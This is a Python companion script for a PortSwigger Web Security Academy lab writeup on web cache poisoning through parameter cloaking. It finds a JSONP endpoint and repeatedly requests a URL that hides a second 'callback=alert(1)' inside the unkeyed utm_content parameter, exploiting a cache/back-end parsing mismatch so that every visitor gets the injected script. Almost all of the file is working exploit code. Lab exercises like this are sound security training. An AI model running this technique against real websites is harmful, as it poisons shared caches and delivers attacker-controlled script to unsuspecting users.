#!/usr/bin/env python3
"""
Parameter cloaking
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 07-parameter-cloaking.md

What this does:
    Locates the JSONP-style script import (callback=setCountryCookie), then
    exploits a parsing discrepancy between the cache (which treats the
    unkeyed utm_content value as one opaque blob) and the Rails back-end
    (which splits on ';' as a secondary parameter delimiter and lets the
    later 'callback' win). The result smuggles a second callback=alert(1)
    past the cache key entirely.

Usage:
    python 07-parameter-cloaking.py <lab-url>
    e.g. python 07-parameter-cloaking.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import re
import secrets
import sys
import httpx


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str) -> None:
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: find the JSONP endpoint from the home page's script imports.
        r = await client.get(lab_url)
        js_paths = re.findall(r'src="(/js/[^"]+)"', r.text)
        if not js_paths:
            js_paths = re.findall(r'src="(/[^"]*\.js[^"]*)"', r.text)

        jsonp_url = None
        for path in js_paths:
            full = f"{lab_url}{path}"
            r2 = await client.get(f"{full}?cb={_cache_buster()}")
            if "callback" in path or "callback" in r2.text:
                jsonp_url = full
                break
            r3 = await client.get(f"{full.split('?')[0]}?callback=testFunc&cb={_cache_buster()}")
            if "testFunc(" in r3.text:
                jsonp_url = full.split("?")[0]
                break

        if not jsonp_url:
            for path in ["/js/geolocate.js", "/js/localize.js"]:
                r4 = await client.get(f"{lab_url}{path}?callback=testFunc&cb={_cache_buster()}")
                if "testFunc(" in r4.text:
                    jsonp_url = f"{lab_url}{path}"
                    break

        if not jsonp_url:
            print("[-] No JSONP endpoint found -- cannot proceed")
            return
        print(f"[+] JSONP endpoint: {jsonp_url}")

        # Step 2: cloaked poison. Rebuilding the query string from the bare
        # path matters -- leaving a stray, already-keyed callback param from
        # the original src attribute silently breaks the cloaking.
        base_jsonp = jsonp_url.split("?")[0]
        poison_url = f"{base_jsonp}?callback=setCountryCookie&utm_content=x;callback=alert(1)"
        print(f"[*] Poison URL: {poison_url}")

        print("[*] Starting poison + re-poison loop...")
        for cycle in range(40):
            r = await client.get(poison_url)
            if _is_cache_miss(dict(r.headers)) and "alert(1)" in r.text:
                print(f"    Cycle {cycle + 1}: POISONED (miss)")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(3)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
